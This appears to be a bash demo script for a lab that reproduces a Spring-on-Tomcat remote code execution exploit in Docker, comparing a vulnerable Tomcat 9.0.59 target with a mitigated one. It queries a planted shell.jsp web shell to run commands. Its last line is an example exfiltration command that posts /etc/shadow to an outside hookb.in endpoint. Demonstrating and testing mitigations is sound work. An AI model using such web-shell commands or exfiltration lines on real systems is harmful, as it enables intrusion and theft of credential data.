#!/bin/bash
echo "building containers"
docker compose build


docker compose up targetspring -d
docker compose up targetspringfixedtomcat -d

echo ""
echo "spring containers starting up"
sleep 10

echo ""
echo "pre-exploit curl to greeter"
echo "--------------------------------"
curl "http://localhost:8080/helloworld/greeting"

echo ""
echo "pre-exploit curl to jsp exploit, should 404"
echo "--------------------------------"
curl "http://localhost:8080/shell.jsp?cmd=id"

echo ""
echo "starting exploit on spring running on vulnerable tomcat (9.0.59)"
echo "--------------------------------"
docker compose up exploit 

echo ""
echo "post-exploit curl to jsp exploit, should show id, web IP"
echo "--------------------------------"
curl "http://localhost:8080/shell.jsp?cmd=id"
curl "http://localhost:8080/shell.jsp?cmd=http://ip4.me/api/"

echo ""
echo "starting exploit on mitigated tomcat (9.0.6.2) target"
echo "--------------------------------"
docker compose up exploitmitigated

echo ""
echo "post-exploit curl to jsp exploit with tomcat mitigations, should 404"
echo "--------------------------------"
curl "http://localhost:8090/shell.jsp?cmd=id"

echo 'for exfil demo, e.g. \n http://localhost:8080/shell.jsp?cmd=curl%20-X%20POST%20-H%20\"Content-Type:%20text/plain\"%20--data-binary%20@/etc/shadow%20https://hookb.in/example124124134'

